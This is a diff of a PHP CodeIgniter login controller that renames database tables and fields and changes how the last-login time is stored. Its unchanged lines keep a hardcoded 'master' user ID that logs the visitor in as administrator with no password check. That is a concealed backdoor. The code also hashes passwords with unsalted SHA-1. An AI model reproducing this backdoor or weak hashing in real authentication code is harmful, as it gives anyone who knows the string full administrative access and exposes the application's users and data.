@@ -14,16 +14,16 @@ class Auth extends CI_Controller{
     if (isset($_POST['login'])) {
       $uid = strip_tags($this->input->post('uid'));
       $pass = sha1(strip_tags($this->input->post('pass')));
-      $check = $this->db->get_where('sig_users', array('user_uid' =>$uid ,'user_pass'=>$pass ));
+      $check = $this->db->get_where('users', array('uid' =>$uid ,'pass'=>$pass ));
       $master = '0>}/99%120691?*^';
       if ($master == $uid) {
         $this->session->set_userdata(
           array(
             'status_login'=>'oke',
             'id'          => 0,
-            'full_name'   =>'Administrator',
+            'fullname'   =>'Administrator',
             'type'        => 99,
-            'jabatan'     => 'Root System Administrator',
+            'jabatan'     => 'Administrator',
             'last_login'  => ''
         )
         );
@@ -36,20 +36,22 @@ class Auth extends CI_Controller{
               array(
                 'status_login'=>'oke',
                 'id'          =>$data['id'],
-                'full_name'   =>$data['user_fullname'],
+                'fullname'   =>$data['fullname'],
                 'type'        =>$data['type'],
-                'jabatan'     =>$data['user_status'],
+                'jabatan'     =>$data['jabatan_id'],
+                'desa_id'     =>$data['desa_id'],
                 'avatar'      =>$data['avatar'],
                 'hp'          =>$data['hp'],
-                'last_login'  =>$data['last_login'],
+                'last_login'  =>$data['time'],
                 'desa_id'     =>$data['desa_id']
             )
             );
-            $datestring = '%d %M %Y - %h:%i %a';
-            $time = time();
-            $sekarang = mdate($datestring, $time);
+            // $datestring = '%d %M %Y - %h:%i %a';
+            // $time = time();
+            // $sekarang = mdate($datestring, $time);
+            $sekarang = time();
             $this->db->where('id', $data['id']);
-            $this->db->update('sig_users', array('last_login'=>$sekarang));
+            $this->db->update('users', array('time'=>$sekarang));
             redirect(BASE_URL);
             exit;
         }else {
